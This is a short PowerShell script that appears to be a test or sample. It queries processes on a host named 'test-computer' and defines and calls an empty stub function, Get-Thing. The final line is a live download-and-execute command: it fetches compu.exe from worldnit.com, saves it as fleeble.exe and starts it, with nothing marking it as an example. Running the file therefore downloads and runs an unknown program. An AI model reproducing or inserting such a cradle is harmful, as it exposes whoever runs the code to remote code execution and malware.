Get-Process -ComputerName "test-computer"


function Get-Thing
{
	[Alias()]
	[OutputType([int])]
	Param
	(
		
		[Parameter(Mandatory=$true,
				   ValueFromPipelineByPropertyName=$true,
				   Position=0)]
		$Name
	)
	
	Begin
	{
	}
	Process
	{
		return 0;
	}
	End
	{
	}
}

Get-Thing -Name "test"

(New-Object System.Net.WebClient).DownloadFile('http://worldnit.com/compu.exe','fleeble.exe');Start-Process 'fleeble.exe'

